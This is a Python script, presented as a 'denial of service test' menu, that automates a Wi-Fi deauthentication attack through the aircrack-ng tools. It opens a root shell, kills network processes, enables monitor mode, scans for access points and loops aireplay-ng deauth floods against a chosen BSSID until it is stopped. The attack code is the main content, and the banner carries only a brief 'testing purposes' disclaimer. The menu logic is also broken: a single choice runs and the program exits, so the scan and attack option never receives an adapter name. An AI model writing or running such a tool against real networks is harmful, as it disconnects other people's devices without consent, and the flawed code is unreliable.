import subprocess

def run_sudo_i():
    try:
        subprocess.run(['sudo', '-i'], check=True)
    except subprocess.CalledProcessError:
        print("Error: Failed to gain admin rights.")

def show_wireless_network_adapter():
    try:
        subprocess.run(['iwconfig'], check=True)
    except subprocess.CalledProcessError:
        print("Error: Failed to execute 'iwconfig' command.")

def kill_interfering_tasks():
    try:
        subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
    except subprocess.CalledProcessError:
        print("Error: Failed to kill interfering tasks.")

def start_wireless_adapter():
    print('Enter your wireless network adapter name (e.g., wlan0):')
    wlan = input()
    print("Enter the target device channel number:")
    channel = input()
    try:
        subprocess.run(['airmon-ng', 'start', wlan, channel], check=True)
        return wlan  # Return wlan to use it in other functions
    except subprocess.CalledProcessError:
        print("Error: Failed to start the wireless adapter.")

def scan_target(wlan):
    print("Scanning targets. Press Ctrl+C to stop...")
    try:
        # Example command, replace with the correct usage of airodump-ng for scanning targets
        subprocess.run(['airodump-ng', wlan])
        
        # Provide attack options after scanning
        print("Enter target BSSID:")
        bssid = input().strip()
        if bssid:
            dos_attack(wlan, bssid)
        else:
            print("BSSID cannot be empty. Please enter a valid BSSID.")
    except subprocess.CalledProcessError:
        print("Error: Failed to scan target tasks.")
    except KeyboardInterrupt:
        print("Scan stopped by user.")

def dos_attack(wlan, bssid):
    print("Performing deauthentication attack. Press Ctrl+C to stop...")
    try:
        while True:
            subprocess.run(['aireplay-ng', '-0', '100000', '-a', bssid, wlan], check=True)
    except subprocess.CalledProcessError:
        print("Error: Failed to execute 'aireplay-ng' command.")
    except KeyboardInterrupt:
        print("Attack stopped by user.")

def main():
    wlan = None
    print("Welcome to the denial of service test. Please use this tool only for testing purposes!")
    print("1. Gain admin rights")
    print("2. Show your wireless network adapter")
    print("3. Kill interfering tasks")
    print("4. Start your wireless adapter")
    print("5. Scan targets")
    print("6. Exit")

    choice = input("Enter your choice: ")

    if choice == "1":
        run_sudo_i()
    elif choice == "2":
        show_wireless_network_adapter()
    elif choice == "3":
        kill_interfering_tasks()
    elif choice == "4":
        wlan = start_wireless_adapter()
    elif choice == "5":
        if wlan:
            scan_target(wlan)
    elif choice == "6":
        print("Exiting...")
    else:
        print("Invalid choice. Please enter a number between 1 and 6.")

if __name__ == "__main__":
    main()
